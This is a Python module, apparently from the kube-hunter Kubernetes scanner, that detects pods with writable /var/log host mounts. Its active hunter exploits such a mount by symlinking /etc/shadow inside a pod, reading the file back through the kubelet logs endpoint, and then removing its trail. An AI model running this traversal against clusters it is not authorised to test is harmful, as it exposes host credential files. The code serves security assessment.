import logging
import re
import uuid

from kube_hunter.conf import get_config
from kube_hunter.core.pubsub.subscription import subscribe
from kube_hunter.core.types import (
    ActiveHunter,
    Hunter,
    KubernetesCluster,
    PrivilegeEscalation,
    Vulnerability,
)
from kube_hunter.modules.hunting.kubelet import (
    ExposedPodsHandler,
    ExposedRunHandler,
    KubeletHandlers,
)

logger = logging.getLogger(__name__)


class WriteMountToVarLog(Vulnerability):
    """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traveral"""

    pods: str

    def __init__(self, pods: str):
        super().__init__(
            name="Pod With Mount To /var/log",
            component=KubernetesCluster,
            category=PrivilegeEscalation,
            vid="KHV047",
            evidence="pods: {pods}",
        )
        self.pods = pods


class DirectoryTraversalWithKubelet(Vulnerability):
    """An attacker can run commands on pods with mount to /var/log,
    and traverse read all files on the host filesystem"""

    output: str

    def __init__(self, output: str):
        super().__init__(
            name="Root Traversal Read On The Kubelet",
            component=KubernetesCluster,
            category=PrivilegeEscalation,
            evidence=f"output: {output}",
        )
        self.output = output


@subscribe(ExposedPodsHandler)
class VarLogMountHunter(Hunter):
    """Mount Hunter - /var/log
    Hunt pods that have write access to host's /var/log. in such case,
    the pod can traverse read files on the host machine
    """

    def has_write_mount_to(self, pod_data, path):
        """Returns volume for correlated writable mount"""
        for volume in pod_data["spec"]["volumes"]:
            if "hostPath" in volume:
                if "Directory" in volume["hostPath"]["type"]:
                    if volume["hostPath"]["path"].startswith(path):
                        return volume

    def execute(self):
        vulnerable_pods = []
        for pod in self.event.pods:
            if self.has_write_mount_to(pod, path="/var/log"):
                vulnerable_pods.append(pod["metadata"]["name"])
        if vulnerable_pods:
            yield WriteMountToVarLog(pods=vulnerable_pods)


@subscribe(ExposedRunHandler)
class ProveVarLogMount(ActiveHunter):
    """Prove /var/log Mount Hunter
    Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log
    """

    def __init__(self, event: ExposedRunHandler):
        super().__init__(event)
        self.base_path = f"https://{self.event.host}:{self.event.port}"

    def run(self, command, container):
        config = get_config()
        run_url = KubeletHandlers.RUN.value.format(
            podNamespace=container["namespace"], podID=container["pod"], containerName=container["name"], cmd=command,
        )
        return self.event.session.post(
            f"{self.base_path}/{run_url}", verify=False, timeout=config.network_timeout
        ).content

    # TODO: replace with multiple subscription to WriteMountToVarLog as well
    def get_varlog_mounters(self):
        config = get_config()
        logger.debug("accessing /pods manually on ProveVarLogMount")
        pods = self.event.session.get(
            f"{self.base_path}/{KubeletHandlers.PODS.value}", verify=False, timeout=config.network_timeout,
        ).json()["items"]
        for pod in pods:
            volume = VarLogMountHunter(ExposedPodsHandler(pods=pods)).has_write_mount_to(pod, "/var/log")
            if volume:
                yield pod, volume

    def mount_path_from_mountname(self, pod, mount_name):
        """returns container name, and container mount path correlated to mount_name"""
        for container in pod["spec"]["containers"]:
            for volume_mount in container["volumeMounts"]:
                if volume_mount["name"] == mount_name:
                    logger.debug(f"yielding {container}")
                    yield container, volume_mount["mountPath"]

    def traverse_read(self, host_file, container, mount_path, host_path):
        """Returns content of file on the host, and cleans trails"""
        config = get_config()
        symlink_name = str(uuid.uuid4())
        self.run(f"ln -s {host_file} {mount_path}/{symlink_name}", container)
        # following symlink with kubelet
        path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(
            path=re.sub(r"^/var/log", "", host_path) + symlink_name
        )
        content = self.event.session.get(
            f"{self.base_path}/{path_in_logs_endpoint}", verify=False, timeout=config.network_timeout,
        ).content
        self.run(f"rm {mount_path}/{symlink_name}", container=container)
        return content

    def execute(self):
        for pod, volume in self.get_varlog_mounters():
            for container, mount_path in self.mount_path_from_mountname(pod, volume["name"]):
                logger.debug("Correlated container to mount_name")
                cont = {
                    "name": container["name"],
                    "pod": pod["metadata"]["name"],
                    "namespace": pod["metadata"]["namespace"],
                }
                try:
                    output = self.traverse_read(
                        "/etc/shadow", container=cont, mount_path=mount_path, host_path=volume["hostPath"]["path"],
                    )
                    yield DirectoryTraversalWithKubelet(output=output)
                except Exception:
                    logger.debug("Could not exploit /var/log", exc_info=True)
